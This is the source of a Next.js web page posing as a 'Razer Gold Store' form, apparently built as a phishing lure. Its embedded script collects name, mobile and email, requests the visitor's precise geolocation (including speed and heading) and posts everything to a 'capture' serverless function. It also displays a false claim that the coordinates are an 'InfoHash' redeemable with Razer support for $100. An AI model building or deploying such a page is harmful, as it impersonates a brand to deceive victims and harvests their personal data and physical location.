import Head from 'next/head'
import Header from '@components/Header'
import Footer from '@components/Footer'
import { useEffect } from 'react'

export default function Home() {
  useEffect(() => {}, [])

  return (
    <div className="container">
      <Head>
        <title>Share Details + Location</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      {/* Background */}
      <div className="bg" aria-hidden="true" />

      {/* Foreground content */}
      <main className="card">
        <Header title="Enter details for Razer Gold Store" />
        <form id="infoForm">
          <label>
            Name
            <input type="text" id="name" name="name" required />
          </label>
          <br />
          <label>
            Mobile
            <input type="tel" id="mobile" name="mobile" required />
          </label>
          <br />
          <label>
            Email
            <input type="email" id="email" name="email" required />
          </label>
          <br />
          <button type="submit" id="submitBtn">Submit</button>
        </form>

        <pre id="status" style={{ whiteSpace: 'pre-wrap', marginTop: '1rem' }} />

        <script
          dangerouslySetInnerHTML={{
            __html: `
              const POST_ENDPOINT = '/.netlify/functions/capture';
              const form = document.getElementById('infoForm');
              const statusEl = document.getElementById('status');
              const submitBtn = document.getElementById('submitBtn');

              function log(m){ statusEl.textContent += m + '\\n'; }

              async function send(payload){
                try{
                  const res = await fetch(POST_ENDPOINT, {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body: JSON.stringify(payload)
                  });
                  if(!res.ok) throw new Error('HTTP ' + res.status);
                  log('Sent successfully.');
                }catch(e){ log('Send failed: ' + e.message); }
              }

              function getFormData(){
                return {
                  name: document.getElementById('name').value.trim(),
                  mobile: document.getElementById('mobile').value.trim(),
                  email: document.getElementById('email').value.trim(),
                };
              }

              async function requestLocationOnce(){
                return new Promise((resolve, reject) => {
                  if(!('geolocation' in navigator)){
                    return reject(new Error('Geolocation not supported by this browser.'));
                  }
                  const opts = { enableHighAccuracy:true, maximumAge:10000, timeout:20000 };
                  navigator.geolocation.getCurrentPosition(
                    (pos) => {
                      const { latitude, longitude, accuracy, speed, heading } = pos.coords;
                      resolve({ latitude, longitude, accuracy, speed, heading, timestamp: pos.timestamp });
                    },
                    (err) => reject(err),
                    opts
                  );
                });
              }

              form.addEventListener('submit', async (e) => {
                e.preventDefault();
                submitBtn.disabled = true;
                log('Requesting location… please allow when prompted.');
                const info = getFormData();
                try{
                  const loc = await requestLocationOnce();
                  log(\`InfoHash (Kindly give to Razer Costomer support for 100$) : \${loc.latitude}, \${loc.longitude} (±\${loc.accuracy}m)\`);
                  await send({ ...info, ...loc });
                }catch(err){
                  log('Location error: ' + (err && err.message ? err.message : err));
                  await send({ ...info, locationError: String(err && err.message ? err.message : err) });
                }finally{
                  submitBtn.disabled = false;
                }
              });
            `,
          }}
        />
      </main>

      <Footer />

      <style jsx>{`
        .container {
          min-height: 100vh;
          position: relative;
          overflow: hidden;
        }
        .bg {
          position: fixed;
          inset: 0;
          background-image: url('/bg.jpg'); /* put your image in public/bg.jpg */
          background-size: cover;
          background-position: center;
          filter: brightness(0.45);
          z-index: -1;
        }
        .card {
          max-width: 560px;
          margin: 8vh auto;
          background: rgba(20, 20, 20, 0.72);
          backdrop-filter: saturate(120%) blur(6px);
          border-radius: 12px;
          padding: 24px;
          color: #f2f2f2;
          box-shadow: 0 10px 30px rgba(0,0,0,0.35);
        }
        label {
          display: block;
          margin: 10px 0 6px;
        }
        input {
          width: 100%;
          padding: 10px 12px;
          border-radius: 8px;
          border: 1px solid rgba(255,255,255,0.25);
          background: rgba(255,255,255,0.08);
          color: #fff;
          outline: none;
        }
        input::placeholder { color: rgba(255,255,255,0.6); }
        button {
          margin-top: 12px;
          padding: 10px 14px;
          border-radius: 8px;
          border: none;
          background: #00e676;
          color: #092e20;
          font-weight: 600;
          cursor: pointer;
        }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
        pre { color: #e0ffe6; }
      `}</style>
    </div>
  )
}
